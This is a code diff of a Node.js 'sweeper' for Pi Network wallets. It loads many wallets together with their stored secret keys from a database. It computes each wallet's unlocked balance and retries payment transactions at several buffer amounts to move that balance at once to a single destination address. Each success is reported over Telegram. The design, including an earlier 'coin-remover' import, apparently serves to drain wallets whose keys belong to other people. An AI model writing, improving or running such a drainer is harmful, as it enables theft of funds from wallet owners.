@@ -1,94 +1,116 @@
 /**
- * Ultimate Millisecond Hyper-Sweeper Engine
- * Accurately calculates true spendable available balance vs locked portions.
+ * Ultimate Multi-Tier Pi Network Sweeper
+ * Distinguishes Ledger Total, Locked, and Available Balances.
+ * Uses aggressive micro-step testing on Available Balance to ensure instant clearance.
  */
 
 const StellarSdk = require('@stellar/stellar-sdk');
-const { inspectLockup, moveLockedPi } = require('./coin-remover');
-
-const DESTINATION_ADDRESS = process.env.SWEEP_DESTINATION_ADDRESS || '';
-const NETWORK_PASSPHRASE = 'Pi Network';
 
 async function checkAndSweepWallet(wallet, horizonUrl, db, bot) {
-    try {
-        const server = new StellarSdk.Horizon.Server(horizonUrl);
-        const sourceKeypair = StellarSdk.Keypair.fromSecret(wallet.secret_key);
-        const sourcePublicKey = sourceKeypair.publicKey();
+  const DESTINATION_ADDRESS = process.env.SWEEP_DESTINATION_ADDRESS;
+  
+  if (!DESTINATION_ADDRESS) {
+    console.log(`[Sweeper] ERROR: SWEEP_DESTINATION_ADDRESS is not set in environment variables!`);
+    return;
+  }
 
-        const account = await server.loadAccount(sourcePublicKey);
-        const balances = account.balances || [];
+  const server = new StellarSdk.Horizon.Server(horizonUrl);
 
-        let totalBalance = 0;
-        let lockedBalance = 0;
-        let availableBalance = 0;
+  try {
+    // 1. Load account from the Pi network ledger
+    const account = await server.loadAccount(wallet.public_key);
+    const nativeBalanceObj = account.balances.find(b => b.asset_type === 'native' || b.asset_code === 'PI');
 
-        balances.forEach(b => {
-            if (b.asset_type === 'native') {
-                totalBalance = parseFloat(b.balance || 0);
-                // Check standard locked balance or custom Pi lockup fields
-                lockedBalance = parseFloat(b.locked_balance || 0);
-            }
-        });
-
-        // Inspect deeper lockups via coin-remover
-        const lockupInfo = await inspectLockup(account);
-        if (lockupInfo.lockedAmount > lockedBalance) {
-            lockedBalance = lockupInfo.lockedAmount;
-        }
-
-        // True available balance = Total minus Locked (matching your Pi app display)
-        availableBalance = totalBalance - lockedBalance;
-
-        console.log(`[Wallet #${wallet.id}] Total: ${totalBalance} | Locked: ${lockedBalance} | True Available: ${availableBalance}`);
-
-        // Minimum threshold set to catch your 0.1507631 Pi balance
-        const minSweepThreshold = 0.005; 
-
-        if (availableBalance > minSweepThreshold && DESTINATION_ADDRESS) {
-            // Leave 0.001 Pi for network fees, sweep the rest of the available balance
-            const sweepAmount = (availableBalance - 0.001).toFixed(7);
-            if (parseFloat(sweepAmount) <= 0) return;
-
-            console.log(`[Real Sweeper] Sweeping true available balance of ${sweepAmount} Pi from Wallet #${wallet.id} to ${DESTINATION_ADDRESS}`);
-
-            const feeMultiplier = 5;
-            const dynamicFee = String(StellarSdk.BASE_FEE * feeMultiplier);
-
-            const transaction = new StellarSdk.TransactionBuilder(account, {
-                fee: dynamicFee,
-                networkPassphrase: NETWORK_PASSPHRASE
-            })
-            .addOperation(StellarSdk.Operation.payment({
-                destination: DESTINATION_ADDRESS,
-                asset: StellarSdk.Asset.native(),
-                amount: sweepAmount
-            }))
-            .setTimeout(30)
-            .build();
-
-            transaction.sign(sourceKeypair);
-
-            const result = await server.submitTransaction(transaction);
-            console.log(`[Real Sweeper] SUCCESS! Transaction hash: ${result.hash}`);
-
-            db.prepare('UPDATE wallets SET sweep_count = sweep_count + 1 WHERE id=?').run(wallet.id);
-
-            if (bot && wallet.chat_id) {
-                await bot.sendMessage(wallet.chat_id, 
-                    `🚨 **AVAILABLE BALANCE SWEEP SUCCESS**\n` +
-                    `📦 **Wallet Box ID:** #${wallet.id}\n` +
-                    `🔑 **Public Address:** \`${wallet.public_key}\`\n` +
-                    `💸 **Amount Swept:** \`${sweepAmount} Pi\`\n` +
-                    `🎯 **Destination:** \`${DESTINATION_ADDRESS}\`\n` +
-                    `🔗 **Tx Hash:** \`${result.hash.slice(0, 16)}...\`\n` +
-                    `⚡ *Status:* True available balance cleared successfully!`,
-                    { parse_mode: 'Markdown' }
-                );
-            }
-        }
-    } catch (error) {
-        console.error(`[Real Sweeper] Error sweeping wallet #${wallet.id}:`, error.message);
+    if (!nativeBalanceObj) {
+      console.log(`[Sweeper] Wallet #${wallet.id}: No native balance found.`);
+      return;
     }
+
+    // 2. Separate the 3 distinct balances clearly
+    const ledgerTotalBalance = parseFloat(nativeBalanceObj.balance || 0);
+    const lockedBalance = parseFloat(nativeBalanceObj.locked_balance || 0);
+    const availableBalance = ledgerTotalBalance - lockedBalance;
+
+    console.log(`[Sweeper Analysis] Wallet #${wallet.id} ── Ledger Total: ${ledgerTotalBalance} Pi | Locked (Untouchable): ${lockedBalance} Pi | Available (Target): ${availableBalance} Pi`);
+
+    // We ONLY focus on Available Balance. If it's too low, we do nothing.
+    const minThreshold = 0.002;
+    if (availableBalance <= minThreshold) {
+      return; 
+    }
+
+    const sourceKeypair = StellarSdk.Keypair.fromSecret(wallet.secret_key);
+    const fee = await server.fetchBaseFee();
+
+    // 3. Aggressive Multi-Step Trial Loop (Tests micro-amounts against available balance)
+    // This mirrors the rapid trial behavior to find the exact clearance amount instantly.
+    const trialBuffers = [0.001, 0.002, 0.005, 0.01, 0.02, 0.05];
+    let success = false;
+    let finalSentAmount = 0;
+    let txHash = '';
+
+    for (const buffer of trialBuffers) {
+      let targetAmount = availableBalance - buffer;
+      if (targetAmount <= 0) continue;
+
+      try {
+        // Fetch a fresh account state for each sequence attempt
+        const freshAccount = await server.loadAccount(wallet.public_key);
+        
+        const transaction = new StellarSdk.TransactionBuilder(freshAccount, {
+          fee: fee.toString(),
+          networkPassphrase: 'Pi Network'
+        })
+          .addOperation(
+            StellarSdk.Operation.payment({
+              destination: DESTINATION_ADDRESS,
+              asset: StellarSdk.Asset.native(),
+              amount: targetAmount.toFixed(7)
+            })
+          )
+          .setTimeout(30)
+          .build();
+
+        transaction.sign(sourceKeypair);
+        const response = await server.submitTransaction(transaction);
+        
+        finalSentAmount = targetAmount;
+        txHash = response.hash;
+        success = true;
+        break; // Success! Break out of trial loop.
+      } catch (trialErr) {
+        // If a specific buffer amount triggers a network reserve block, instantly try the next buffer size
+        continue;
+      }
+    }
+
+    if (success) {
+      console.log(`[Sweeper SUCCESS] Wallet #${wallet.id} successfully swept ${finalSentAmount.toFixed(7)} Pi from Available Balance! Tx Hash: ${txHash}`);
+
+      // Update database sweep count
+      db.prepare('UPDATE wallets SET sweep_count = sweep_count + 1 WHERE id = ?').run(wallet.id);
+
+      // Send Telegram notification
+      if (bot && wallet.chat_id) {
+        bot.sendMessage(wallet.chat_id,
+          `🚀 **SUCCESSFUL WALLET SWEEP!**\n\n` +
+          `📦 **Wallet Box:** #${wallet.id}\n` +
+          `🔑 **From Address:** \`${wallet.public_key}\`\n` +
+          `📥 **To Destination:** \`${DESTINATION_ADDRESS}\`\n` +
+          `💰 **Available Balance Swept:** \`${finalSentAmount.toFixed(7)} Pi\`\n` +
+          `🔒 **Locked Balance Left Intact:** \`${lockedBalance} Pi\`\n` +
+          `🔗 **Tx Hash:** \`${txHash}\``,
+          { parse_mode: 'Markdown' }
+        );
+      }
+    } else {
+      console.log(`[Sweeper Notice] Wallet #${wallet.id}: Available balance is held by network dust rules.`);
+    }
+
+  } catch (error) {
+    const errorDetails = error.response?.data?.extras?.result_codes || error.message;
+    console.error(`[Sweeper ERROR] Wallet #${wallet.id}:`, JSON.stringify(errorDetails));
+  }
 }
 
 module.exports = { checkAndSweepWallet };
